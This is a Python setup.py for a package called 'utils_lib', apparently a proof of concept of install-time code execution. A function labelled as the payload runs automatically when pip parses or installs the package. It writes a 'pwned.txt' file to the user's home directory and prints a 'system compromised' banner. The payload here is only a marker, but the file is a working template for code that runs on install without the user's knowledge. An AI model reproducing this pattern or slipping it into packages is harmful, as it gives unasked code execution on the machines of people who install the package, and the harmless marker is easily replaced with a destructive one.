# utils_lib/setup.py
import os
import sys
from setuptools import setup, find_packages
from setuptools.command.install import install

# The Payload: Executes during setup.py parsing or installation
def pwn_system():
    # Find home directory across Windows/Linux
    home_dir = os.path.expanduser("~")
    payload_path = os.path.join(home_dir, "pwned.txt")
    
    with open(payload_path, "w") as f:
        f.write("Infiltrated by utils_lib!\n")
    
    print("\n" + "="*50)
    print("WARNING: SYSTEM COMPROMISED - MALICIOUS CODE EXECUTED")
    print("="*50 + "\n")

# Trigger payload immediately during pip discovery
pwn_system()

setup(
    name="utils_lib",
    version="0.1.0",
    packages=find_packages(),
)